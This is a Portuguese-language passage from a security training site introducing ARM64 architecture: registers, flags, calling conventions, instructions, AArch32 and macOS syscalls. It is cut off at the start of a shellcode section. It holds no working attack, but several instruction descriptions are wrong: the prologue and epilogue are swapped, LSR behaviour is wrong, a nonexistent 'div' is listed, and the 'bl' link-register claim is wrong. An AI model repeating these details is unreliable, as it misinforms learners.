# Introduction to ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

Na arquitetura ARMv8, os níveis de execução, conhecidos como Exception Levels (ELs), definem o nível de privilégio e as capacidades do ambiente de execução. Existem quatro exception levels, variando de EL0 a EL3, cada um servindo a um propósito diferente:

1. **EL0 - Modo de Usuário**:
- Este é o nível com menor privilégio e é usado para executar código de aplicativos regulares.
- Aplicações executando em EL0 são isoladas umas das outras e do software do sistema, aumentando a segurança e a estabilidade.
2. **EL1 - Modo Kernel do Sistema Operacional**:
- A maioria dos kernels de sistemas operacionais roda neste nível.
- EL1 tem mais privilégios que EL0 e pode acessar recursos do sistema, mas com algumas restrições para garantir a integridade do sistema. Você passa de EL0 para EL1 com a instrução `SVC`.
3. **EL2 - Modo Hypervisor**:
- Este nível é usado para virtualização. Um hypervisor executando em EL2 pode gerenciar múltiplos sistemas operacionais (cada um no seu próprio EL1) rodando no mesmo hardware físico.
- EL2 fornece recursos para isolamento e controle dos ambientes virtualizados.
- Assim, aplicações de máquina virtual como Parallels podem usar o `hypervisor.framework` para interagir com EL2 e executar VMs sem precisar de extensões de kernel.
- Para mover de EL1 para EL2 a instrução `HVC` é usada.
4. **EL3 - Secure Monitor Mode**:
- Este é o nível mais privilegiado e é frequentemente usado para boot seguro e ambientes de execução confiáveis.
- EL3 pode gerenciar e controlar acessos entre estados seguro e não-seguro (como secure boot, trusted OS, etc.).
- Ele foi usado para KPP (Kernel Patch Protection) no macOS, mas não é mais usado.
- EL3 não é mais utilizado pela Apple.
- A transição para EL3 é tipicamente feita usando a instrução `SMC` (Secure Monitor Call).

O uso desses níveis permite uma maneira estruturada e segura de gerenciar diferentes aspectos do sistema, desde aplicações de usuário até o software de sistema mais privilegiado. A abordagem do ARMv8 para níveis de privilégio ajuda a isolar efetivamente diferentes componentes do sistema, reforçando a segurança e a robustez do sistema.

## **Registers (ARM64v8)**

ARM64 tem **31 registradores de uso geral**, rotulados `x0` até `x30`. Cada um pode armazenar um valor de **64-bit** (8 bytes). Para operações que requerem apenas valores de 32-bit, os mesmos registradores podem ser acessados em modo 32-bit usando os nomes `w0` até `w30`.

1. **`x0`** a **`x7`** - Normalmente usados como registradores temporários e para passar parâmetros para subrotinas.
- **`x0`** também carrega o dado de retorno de uma função
2. **`x8`** - No kernel Linux, `x8` é usado como o número de system call para a instrução `svc`. **No macOS o x16 é o que é usado!**
3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
4. **`x16`** e **`x17`** - **Intra-procedural Call Registers**. Registradores temporários para valores imediatos. Também são usados para chamadas indiretas de função e stubs PLT (Procedure Linkage Table).
- **`x16`** é usado como o **número de system call** para a instrução **`svc`** no **macOS**.
5. **`x18`** - **Platform register**. Pode ser usado como registrador de uso geral, mas em algumas plataformas este registrador é reservado para usos específicos da plataforma: Pointer para o bloco de ambiente de thread atual no Windows, ou para apontar para a estrutura de tarefa atualmente **executando no kernel do linux**.
6. **`x19`** a **`x28`** - São registradores callee-saved. Uma função deve preservar os valores desses registradores para seu chamador, então eles são armazenados na stack e recuperados antes de retornar ao chamador.
7. **`x29`** - **Frame pointer** para rastrear o frame da stack. Quando um novo frame de stack é criado por causa de uma chamada de função, o registrador **`x29`** é **armazenado na stack** e o endereço do **novo** frame pointer (o endereço de **`sp`**) é **armazenado neste registrador**.
- Esse registrador também pode ser usado como um **registrador de uso geral**, embora normalmente seja usado como referência para **variáveis locais**.
8. **`x30`** ou **`lr`**- **Link register**. Ele contém o **endereço de retorno** quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada, armazenando o valor do **`pc`** neste registrador.
- Também pode ser usado como qualquer outro registrador.
- Se a função atual for chamar uma nova função e portanto sobrescrever `lr`, ela armazenará `lr` na stack no início; isso é o epílogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Armazena `fp` e `lr`, gera espaço e obtém novo `fp`) e o recupera no final, isso é o prólogo (`ldp x29, x30, [sp], #48; ret` -> Recupera `fp` e `lr` e retorna).
9. **`sp`** - **Stack pointer**, usado para rastrear o topo da stack.
- o valor de **`sp`** deve sempre manter um **alinhamento** de pelo menos um **quadword** ou uma exceção de alinhamento pode ocorrer.
10. **`pc`** - **Program counter**, que aponta para a próxima instrução. Este registrador só pode ser atualizado através de geração de exceções, retornos de exceção, e branches. As únicas instruções ordinárias que podem ler este registrador são as instruções branch with link (BL, BLR) para armazenar o endereço do **`pc`** em **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Também chamado **`wzr`** na sua forma de registrador **32**-bit. Pode ser usado para obter facilmente o valor zero (operação comum) ou para realizar comparações usando **`subs`** como **`subs XZR, Xn, #10`** armazenando o dado resultante em lugar nenhum (em **`xzr`**).

Os registradores **`Wn`** são a versão **32bit** do registrador **`Xn`**.

> [!TIP]
> Os registradores de X0 - X18 são voláteis, o que significa que seus valores podem ser alterados por chamadas de função e interrupções. Porém, os registradores de X19 - X28 são não-voláteis, significando que seus valores devem ser preservados através das chamadas de função ("callee saved").

### SIMD and Floating-Point Registers

Além disso, existem mais **32 registradores de 128bit** que podem ser utilizados em operações SIMD (single instruction multiple data) otimizadas e para realizar aritmética de ponto flutuante. Esses são chamados de registradores Vn embora também possam operar em **64**-bit, **32**-bit, **16**-bit e **8**-bit e então são chamados **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.

### System Registers

**Existem centenas de system registers**, também chamados special-purpose registers (SPRs), que são usados para **monitorar** e **controlar** o comportamento dos **processors**.\
Eles só podem ser lidos ou definidos usando as instruções especiais dedicadas **`mrs`** e **`msr`**.

Os registradores especiais **`TPIDR_EL0`** e **`TPIDDR_EL0`** são comumente encontrados ao fazer reverse engineering. O sufixo `EL0` indica a **exception mínima** a partir da qual o registrador pode ser acessado (neste caso EL0 é o nível de exception (privilégio) regular que programas normais executam).\
Eles são frequentemente usados para armazenar o **endereço base do thread-local storage** da região de memória. Normalmente o primeiro é legível e gravável por programas rodando em EL0, mas o segundo pode ser lido de EL0 e escrito de EL1 (como no kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contém vários componentes do processo serializados no registrador especial visível ao sistema operacional **`SPSR_ELx`**, sendo X o **nível de permissão da exceção** disparada (isso permite recuperar o estado do processo quando a exceção termina).\
Estes são os campos acessíveis:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- As flags de condição **`N`**, **`Z`**, **`C`** e **`V`**:
- **`N`** significa que a operação produziu um resultado negativo
- **`Z`** significa que a operação resultou em zero
- **`C`** significa que a operação teve um carry
- **`V`** significa que a operação produziu um overflow com sinal:
- A soma de dois números positivos resulta em um resultado negativo.
- A soma de dois números negativos resulta em um resultado positivo.
- Em subtração, quando um número negativo grande é subtraído de um número positivo menor (ou vice-versa), e o resultado não pode ser representado dentro do intervalo do tamanho de bits dado.
- Obviamente o processador não sabe se a operação é com sinal ou não, então ele verificará C e V nas operações e indicará se ocorreu um carry no caso de ser com sinal ou sem sinal.

> [!WARNING]
> Nem todas as instruções atualizam essas flags. Algumas como **`CMP`** ou **`TST`** o fazem, e outras que têm um sufixo s como **`ADDS`** também o fazem.

- A flag de **largura atual do registrador (`nRW`)**: Se a flag tem o valor 0, o programa rodará no estado de execução AArch64 uma vez retomado.
- O **Exception Level** atual (**`EL`**): Um programa regular rodando em EL0 terá o valor 0
- A flag de **single stepping** (**`SS`**): Usada por debuggers para single step configurando a flag SS para 1 dentro de **`SPSR_ELx`** através de uma exceção. O programa executará um passo e disparará uma exceção de single step.
- A flag de **estado de exceção ilegal** (**`IL`**): É usada para marcar quando um software privilegiado realiza uma transferência de exception level inválida, essa flag é setada para 1 e o processador dispara uma illegal state exception.
- As flags **`DAIF`**: Essas flags permitem que um programa privilegiado mascarare seletivamente certas exceções externas.
- Se **`A`** é 1 significa que **asynchronous aborts** serão disparados. O **`I`** configura a resposta a **Interrupt Requests** (IRQs) externos de hardware. e o F está relacionado a **Fast Interrupt Requests** (FIRs).
- As flags de **select de stack pointer** (**`SPS`**): Programas privilegiados rodando em EL1 e acima podem alternar entre usar seu próprio registrador stack pointer e o do modelo usuário (por exemplo, entre `SP_EL1` e `EL0`). Essa troca é realizada escrevendo no registrador especial **`SPSel`**. Isso não pode ser feito a partir de EL0.

## **Calling Convention (ARM64v8)**

A calling convention do ARM64 especifica que os **oito primeiros parâmetros** para uma função são passados nos registradores **`x0` até `x7`**. **Parâmetros adicionais** são passados na **stack**. O **valor de retorno** é passado de volta no registrador **`x0`**, ou também em **`x1`** se tiver **128 bits**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** através das chamadas de função.

Ao ler uma função em assembly, procure pelo **prologue** e **epilogue** da função. O **prologue** geralmente envolve **salvar o frame pointer (`x29`)**, **configurar** um **novo frame pointer**, e **alocar espaço na stack**. O **epilogue** geralmente envolve **restaurar o frame pointer salvo** e **retornar** da função.

### Calling Convention in Swift

Swift possui sua própria **calling convention** que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

Instruções ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser executada (como `add`, `sub`, `mov`, etc.), **`dst`** é o registrador **destino** onde o resultado será armazenado, e **`src1`** e **`src2`** são os registradores **origem**. Valores imediatos também podem ser usados no lugar de registradores de origem.

- **`mov`**: **Move** um valor de um **registrador** para outro.
- Example: `mov x0, x1` — Isso move o valor de `x1` para `x0`.
- **`ldr`**: **Load** um valor da **memória** para um **registrador**.
- Example: `ldr x0, [x1]` — Isso carrega um valor do endereço apontado por `x1` para `x0`.
- **Offset mode**: Um offset afetando o ponteiro de origem é indicado, por exemplo:
- `ldr x2, [x1, #8]`, isso carregará em x2 o valor de x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, isso carregará em x2 um objeto do array x0, da posição x1 (index) \* 4
- **Pre-indexed mode**: Isso aplicará cálculos à origem, obterá o resultado e também armazenará a nova origem na origem.
- `ldr x2, [x1, #8]!`, isso carregará `x1 + 8` em `x2` e armazenará em x1 o resultado de `x1 + 8`
- `str lr, [sp, #-4]!`, Armazena o link register em sp e atualiza o registrador sp
- **Post-index mode**: Isso é como o anterior, mas o endereço de memória é acessado e então o offset é calculado e armazenado.
- `ldr x0, [x1], #8`, carrega `x1` em `x0` e atualiza x1 com `x1 + 8`
- **PC-relative addressing**: Neste caso o endereço a ser carregado é calculado relativo ao registrador PC
- `ldr x1, =_start`, Isso carregará o endereço onde o símbolo `_start` começa em x1 relativo ao PC atual.
- **`str`**: **Store** um valor de um **registrador** na **memória**.
- Example: `str x0, [x1]` — Isso armazena o valor em `x0` no endereço de memória apontado por `x1`.
- **`ldp`**: **Load Pair of Registers**. Esta instrução **carrega dois registradores** de **locais de memória consecutivos**. O endereço de memória é tipicamente formado adicionando um offset ao valor em outro registrador.
- Example: `ldp x0, x1, [x2]` — Isso carrega `x0` e `x1` dos endereços de memória em `x2` e `x2 + 8`, respectivamente.
- **`stp`**: **Store Pair of Registers**. Esta instrução **armazena dois registradores** em **locais de memória consecutivos**. O endereço de memória é tipicamente formado adicionando um offset ao valor em outro registrador.
- Example: `stp x0, x1, [sp]` — Isso armazena `x0` e `x1` nos endereços de memória em `sp` e `sp + 8`, respectivamente.
- `stp x0, x1, [sp, #16]!` — Isso armazena `x0` e `x1` nos endereços de memória em `sp+16` e `sp + 24`, respectivamente, e atualiza `sp` com `sp+16`.
- **`add`**: **Soma** os valores de dois registradores e armazena o resultado em um registrador.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destino
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registrador ou imediato)
- \[shift #N | RRX] -> Realiza um shift ou chama RRX
- Example: `add x0, x1, x2` — Isso soma os valores em `x1` e `x2` e armazena o resultado em `x0`.
- `add x5, x5, #1, lsl #12` — Isso equivale a 4096 (um 1 deslocado 12 vezes) -> 1 0000 0000 0000 0000
- **`adds`** Isso realiza um `add` e atualiza as flags
- **`sub`**: **Subtrai** os valores de dois registradores e armazena o resultado em um registrador.
- Veja a **syntax** de **`add`**.
- Example: `sub x0, x1, x2` — Isso subtrai o valor em `x2` de `x1` e armazena o resultado em `x0`.
- **`subs`** Isso é como sub mas atualiza a flag
- **`mul`**: **Multiplica** os valores de **dois registradores** e armazena o resultado em um registrador.
- Example: `mul x0, x1, x2` — Isso multiplica os valores em `x1` e `x2` e armazena o resultado em `x0`.
- **`div`**: **Divide** o valor de um registrador por outro e armazena o resultado em um registrador.
- Example: `div x0, x1, x2` — Isso divide o valor em `x1` por `x2` e armazena o resultado em `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Adiciona 0s no final movendo os outros bits para frente (multiplica por n vezes 2)
- **Logical shift right**: Adiciona 1s no início movendo os outros bits para trás (divide por n vezes 2 em unsigned)
- **Arithmetic shift right**: Como **`lsr`**, mas em vez de adicionar 0s se o bit mais significativo for 1, **1s são adicionados** (divide por n vezes 2 em signed)
- **Rotate right**: Como **`lsr`** mas aquilo que é removido da direita é acrescentado à esquerda
- **Rotate Right with Extend**: Como **`ror`**, mas com a flag de carry como o "bit mais significativo". Então a flag de carry é movida para o bit 31 e o bit removido para a flag de carry.
- **`bfm`**: **Bit Filed Move**, essas operações **copiam bits `0...n`** de um valor e os colocam nas posições **`m..m+n`**. O **`#s`** especifica a **posição do bit mais à esquerda** e **`#r`** a **quantidade de rotação à direita**.
- Bitfiled move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Copia um bitfield de um registrador e o copia para outro registrador.
- **`BFI X1, X2, #3, #4`** Insere 4 bits de X2 a partir do 3º bit de X1
- **`BFXIL X1, X2, #3, #4`** Extrai do 3º bit de X2 quatro bits e os copia para X1
- **`SBFIZ X1, X2, #3, #4`** Estende com sinal 4 bits de X2 e os insere em X1 começando na posição de bit 3 zerando os bits à direita
- **`SBFX X1, X2, #3, #4`** Extrai 4 bits começando no bit 3 de X2, estende com sinal, e coloca o resultado em X1
- **`UBFIZ X1, X2, #3, #4`** Estende com zeros 4 bits de X2 e os insere em X1 começando na posição de bit 3 zerando os bits à direita
- **`UBFX X1, X2, #3, #4`** Extrai 4 bits começando no bit 3 de X2 e coloca o resultado zero-extendido em X1.
- **Sign Extend To X:** Estende o sinal (ou adiciona apenas 0s na versão unsigned) de um valor para poder realizar operações com ele:
- **`SXTB X1, W2`** Estende o sinal de um byte **de W2 para X1** (`W2` é metade de `X2`) para preencher os 64bits
- **`SXTH X1, W2`** Estende o sinal de um número de 16bit **de W2 para X1** para preencher os 64bits
- **`SXTW X1, W2`** Estende o sinal de um byte **de W2 para X1** para preencher os 64bits
- **`UXTB X1, W2`** Adiciona 0s (unsigned) a um byte **de W2 para X1** para preencher os 64bits
- **`extr`:** Extrai bits de um **par de registradores concatenados** especificado.
- Example: `EXTR W3, W2, W1, #3` Isso irá **concatenar W1+W2** e obter **do bit 3 de W2 até o bit 3 de W1** e armazenar em W3.
- **`cmp`**: **Compara** dois registradores e seta flags de condição. É um **alias de `subs`** definindo o registrador destino como o zero register. Útil para saber se `m == n`.
- Suporta a **mesma sintaxe que `subs`**
- Example: `cmp x0, x1` — Isso compara os valores em `x0` e `x1` e seta as flags de condição adequadamente.
- **`cmn`**: **Compare negative** operand. Neste caso é um **alias de `adds`** e suporta a mesma sintaxe. Útil para saber se `m == -n`.
- **`ccmp`**: Comparação condicional, é uma comparação que será realizada apenas se uma comparação anterior foi verdadeira e especificamente setará bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, pula para func
- Isso porque **`ccmp`** só será executado se o **`cmp`** anterior foi um `NE`, se não for os bits `nzcv` serão definidos para 0 (o que não satisfará a comparação `blt`).
- Isso também pode ser usado como `ccmn` (mesmo mas negativo, como `cmp` vs `cmn`).
- **`tst`**: Verifica se algum dos valores da comparação são ambos 1 (funciona como um ANDS sem armazenar o resultado em lugar nenhum). É útil para checar um registrador com um valor e verificar se algum dos bits do registrador indicado no valor é 1.
- Example: `tst X1, #7` Verifica se algum dos últimos 3 bits de X1 é 1
- **`teq`**: Operação XOR descartando o resultado
- **`b`**: Branch incondicional
- Example: `b myFunction`
- Note que isso não preencherá o link register com o endereço de retorno (não é adequado para chamadas de subrotina que precisam voltar)
- **`bl`**: **Branch** com link, usado para **chamar** uma **subrotina**. Armazena o **endereço de retorno em `x30`**.
- Example: `bl myFunction` — Isso chama a função `myFunction` e armazena o endereço de retorno em `x30`.
- Note que isso não preencherá o link register com o endereço de retorno (não é adequado para chamadas de subrotina que precisam voltar)
- **`blr`**: **Branch** com Link para Registrador, usado para **chamar** uma **subrotina** onde o alvo é **especificado** em um **registrador**. Armazena o endereço de retorno em `x30`. (Isto é
- Example: `blr x1` — Isso chama a função cujo endereço está contido em `x1` e armazena o endereço de retorno em `x30`.
- **`ret`**: **Retorna** de uma **subrotina**, tipicamente usando o endereço em **`x30`**.
- Example: `ret` — Isso retorna da subrotina atual usando o endereço de retorno em `x30`.
- **`b.<cond>`**: Branches condicionais
- **`b.eq`**: **Branch se igual**, baseado na instrução `cmp` anterior.
- Example: `b.eq label` — Se a instrução `cmp` anterior encontrou dois valores iguais, isto salta para `label`.
- **`b.ne`**: **Branch se Não Igual**. Esta instrução verifica as flags de condição (que foram setadas por uma instrução de comparação anterior), e se os valores comparados não eram iguais, ela faz branch para um label ou endereço.
- Example: Após uma instrução `cmp x0, x1`, `b.ne label` — Se os valores em `x0` e `x1` não eram iguais, isto salta para `label`.
- **`cbz`**: **Compare and Branch on Zero**. Esta instrução compara um registrador com zero, e se forem iguais, ela faz branch para um label ou endereço.
- Example: `cbz x0, label` — Se o valor em `x0` é zero, isto salta para `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Esta instrução compara um registrador com zero, e se não forem iguais, ela faz branch para um label ou endereço.
- Example: `cbnz x0, label` — Se o valor em `x0` não é zero, isto salta para `label`.
- **`tbnz`**: Testa bit e faz branch se não-zero
- Example: `tbnz x0, #8, label`
- **`tbz`**: Testa bit e faz branch se zero
- Example: `tbz x0, #8, label`
- **Operações de seleção condicional**: São operações cujo comportamento varia dependendo dos bits condicionais.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Se verdadeiro, X0 = X1, se falso, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Se verdadeiro, Xd = Xn + 1, se falso, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Se verdadeiro, Xd = NOT(Xn), se falso, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = - Xm
- `cneg Xd, Xn, cond` -> Se verdadeiro, Xd = - Xn, se falso, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = 1, se falso, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = \<all 1>, se falso, Xd = 0
- **`adrp`**: Calcula o **endereço da página de um símbolo** e o armazena em um registrador.
- Example: `adrp x0, symbol` — Isso calcula o endereço de página de `symbol` e o armazena em `x0`.
- **`ldrsw`**: **Load** um valor **signed 32-bit** da memória e **sign-extend** para 64 bits. Isso é usado para casos comuns de SWITCH.
- Example: `ldrsw x0, [x1]` — Isso carrega um valor signed 32-bit do endereço apontado por `x1`, sign-extend para 64 bits, e armazena em `x0`.
- **`stur`**: **Armazena** o valor de um registrador em um local de memória, usando um offset de outro registrador.
- Example: `stur x0, [x1, #4]` — Isso armazena o valor em `x0` no endereço de memória que é 4 bytes maior que o endereço atualmente em `x1`.
- **`svc`** : Faz uma **system call**. Significa "Supervisor Call". Quando o processador executa esta instrução, ele **muda do modo usuário para o modo kernel** e salta para um local específico na memória onde o **código de tratamento de system call do kernel** está localizado.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Salvar o link register e o frame pointer na stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurar o novo frame pointer**: `mov x29, sp` (configura o novo frame pointer para a função atual)
3. **Alocar espaço na pilha para variáveis locais** (se necessário): `sub sp, sp, <size>` (onde `<size>` é o número de bytes necessários)

### **Epílogo da função**

1. **Desalocar variáveis locais (se alguma foi alocada)**: `add sp, sp, <size>`
2. **Restaurar o link register e o frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (retorna o controle para o chamador usando o endereço no registrador de link)

## Proteções comuns de memória ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Estado de execução AARCH32

Armv8-A suporta a execução de programas de 32 bits. **AArch32** pode executar-se em um de **dois conjuntos de instruções**: **`A32`** e **`T32`** e pode alternar entre eles via **`interworking`**.\
**Privilegiados** programas 64-bit podem agendar a **execução de 32-bit** executando uma transferência de nível de exceção para o 32-bit com menor privilégio.\
Observe que a transição de 64-bit para 32-bit ocorre com uma redução do nível de exceção (por exemplo, um programa 64-bit em EL1 acionando um programa em EL0). Isso é feito definindo o **bit 4 do** **`SPSR_ELx`** registrador especial **para 1** quando a thread do processo `AArch32` estiver pronta para ser executada e o restante de `SPSR_ELx` armazena o CPSR do programa `AArch32`. Então, o processo privilegiado chama a instrução **`ERET`** para que o processador transicione para **`AArch32`** entrando em A32 ou T32 dependendo do CPSR**.**

O **`interworking`** ocorre usando os bits J e T do CPSR. `J=0` e `T=0` significam **`A32`** e `J=0` e `T=1` significam **T32**. Isso basicamente equivale a definir o **bit menos significativo para 1** para indicar que o conjunto de instruções é T32.\
Isso é definido durante as **instruções de branch de interworking,** mas também pode ser definido diretamente por outras instruções quando o PC é definido como o registrador de destino. Exemplo:

Outro exemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registradores

Existem 16 registradores de 32 bits (r0-r15). **From r0 to r14** eles podem ser usados para **qualquer operação**, no entanto alguns deles costumam ser reservados:

- **`r15`**: Program counter (sempre). Contém o endereço da próxima instrução. Em A32 current + 8, em T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)
- **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - Registrador de Estado Atual do Programa

Em AArch32 o `CPSR` funciona de forma semelhante ao **`PSTATE`** em AArch64 e também é armazenado em **`SPSR_ELx`** quando uma exceção é tomada para restaurar posteriormente a execução:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Os campos estão divididos em alguns grupos:

- Application Program Status Register (APSR): Flags aritméticas e acessível a partir do EL0
- Execution State Registers: Comportamento do processo (gerenciado pelo OS).

#### Application Program Status Register (APSR)

- As flags **`N`**, **`Z`**, **`C`**, **`V`** (igual em AArch64)
- A flag **`Q`**: É definida para 1 sempre que ocorre **saturação inteira** durante a execução de uma instrução aritmética especializada de saturação. Uma vez definida para **`1`**, mantém esse valor até ser manualmente definida para 0. Além disso, não existe nenhuma instrução que verifique seu valor implicitamente; deve ser lida manualmente.
- Flags **`GE`** (Greater than or equal): São usadas em operações SIMD (Single Instruction, Multiple Data), como "parallel add" e "parallel subtract". Essas operações permitem processar múltiplos pontos de dados em uma única instrução.

Por exemplo, a instrução **`UADD8`** **soma quatro pares de bytes** (de dois operandos de 32 bits) em paralelo e armazena os resultados num registrador de 32 bits. Em seguida, **define as flags `GE` no `APSR`** com base nesses resultados. Cada flag GE corresponde a uma das adições de byte, indicando se a adição para aquele par de bytes **transbordou**.

A instrução **`SEL`** usa essas flags GE para executar ações condicionais.

#### Execution State Registers

- Os bits **`J`** e **`T`**: **`J`** deve ser 0 e se **`T`** for 0 o conjunto de instruções A32 é usado, e se for 1, o T32 é usado.
- **IT Block State Register** (`ITSTATE`): São os bits 10-15 e 25-26. Armazenam condições para instruções dentro de um grupo prefixado por **`IT`**.
- Bit **`E`**: Indica o **endianness**.
- **Mode and Exception Mask Bits** (0-4): Determinam o estado de execução atual. O **5º** indica se o programa roda como 32bit (um 1) ou 64bit (um 0). Os outros 4 representam o **modo de exceção atualmente em uso** (quando uma exceção ocorre e está sendo tratada). O número definido **indica a prioridade atual** caso outra exceção seja disparada enquanto esta está sendo tratada.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Certas exceções podem ser desabilitadas usando os bits **`A`**, `I`, `F`. Se **`A`** for 1 isso significa que **asynchronous aborts** serão acionados. O **`I`** configura a resposta a **Interrupts Requests** (IRQs) de hardware externo. e o `F` está relacionado a **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Consulte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ou execute `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Veja em [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) o `mach_trap_table` e em [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) os protótipos. O número máximo de Mach traps é `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, então você precisa chamar os números da lista anterior com um **menos**: **`_kernelrpc_mach_vm_allocate_trap`** é **`-10`**.

Você também pode inspecionar **`libsystem_kernel.dylib`** num disassembler para descobrir como chamar esses (e os BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note que **Ida** e **Ghidra** também podem decompilar **dylibs específicos** do cache apenas passando o cache.

> [!TIP]
> Às vezes é mais fácil verificar o código **decompilado** de **`libsystem_kernel.dylib`** **do que** verificar o **código fonte** porque o código de várias syscalls (BSD e Mach) é gerado via scripts (verifique os comentários no código fonte) enquanto no dylib você pode encontrar o que está sendo chamado.

### machdep calls

O XNU suporta outro tipo de chamadas chamadas machine dependent. Os números dessas chamadas dependem da arquitetura e nem as chamadas nem os números são garantidos permanecer constantes.

### comm page

Esta é uma página de memória pertencente ao kernel que é mapeada no espaço de endereçamento de cada processo de usuário. Destina-se a tornar a transição do user mode para o kernel space mais rápida do que usar syscalls para serviços do kernel que são tão usados que essa transição seria muito ineficiente.

Por exemplo a chamada `gettimeofdate` lê o valor de `timeval` diretamente da comm page.

### objc_msgSend

É muito comum encontrar esta função usada em programas Objective-C ou Swift. Esta função permite chamar um método de um objeto Objective-C.

Parâmetros ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Ponteiro para a instância
- x1: op -> Seletor do método
- x2... -> Resto dos argumentos do método invocado

Portanto, se você colocar um breakpoint antes do branch para essa função, você pode facilmente descobrir o que é invocado em lldb com (neste exemplo o objeto chama um objeto de `NSConcreteTask` que executará um comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Definindo a variável de ambiente **`NSObjCMessageLoggingEnabled=1`** é possível gerar **log** quando essa função é chamada em um arquivo como `/tmp/msgSends-pid`.
>
> Além disso, definindo **`OBJC_HELP=1`** e executando qualquer binary você pode ver outras variáveis de ambiente que poderia usar para **log** quando certas ações Objc-C ocorrem.

Quando essa função é chamada, é necessário encontrar o método chamado da instância indicada; para isso são feitas diferentes buscas:

- Realizar optimistic cache lookup:
- Se bem-sucedido, concluído
- Adquirir runtimeLock (read)
- Se (realize && !cls->realized) realize class
- Se (initialize && !cls->initialized) initialize class
- Tentar cache próprio da classe:
- Se bem-sucedido, concluído
- Tentar lista de métodos da classe:
- Se encontrado, preencher cache e concluído
- Tentar cache da superclasse:
- Se bem-sucedido, concluído
- Tentar lista de métodos da superclasse:
- Se encontrado, preencher cache e concluído
- Se (resolver) tentar method resolver, e repetir a partir da class lookup
- Se ainda aqui (= tudo mais falhou) tentar forwarder

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
